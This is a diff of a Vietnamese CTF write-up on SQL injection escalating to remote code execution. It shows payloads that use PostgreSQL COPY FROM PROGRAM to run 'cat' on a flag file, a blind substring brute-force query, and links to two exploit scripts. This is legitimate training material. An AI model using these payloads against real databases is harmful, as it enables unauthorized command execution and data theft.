@@ -119,13 +119,14 @@
 - Vậy là ta kiếm được tên file là `flags3JDE.txt`
 - Tương tự với cách trên, ta tạo 1 bảng chứa nội dung của file `flags3JDE.txt`
     + `'; CREATE TABLE efg(sss text);--`
-    + `'; COPY efg FROM PROGRAM 'cat flags3JDE.txt';--`
+    + `'; COPY efg FROM PROGRAM 'cat /flags3JDE.txt';--`
     + Rồi tương tự dùng brute force để đọc lại bảng `efg`: `' OR (SELECT SUBSTRING(sss,1,1) FROM efg LIMIT 1) = 'a'--`
 
-
-
-
-
+----------------------------
+### Script python:
+- [Tìm tên file](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/ckArenapy/Baby_SQL_Injection_to_RCE_1.py)
+- [In flag](https://github.com/toanvunee/Training-KCSC/blob/main/Task-1/ckArenapy/Baby_SQL_Injection_to_RCE_2.py)
+----------------------------
 
 
 # 3. Blind Logger Middleware
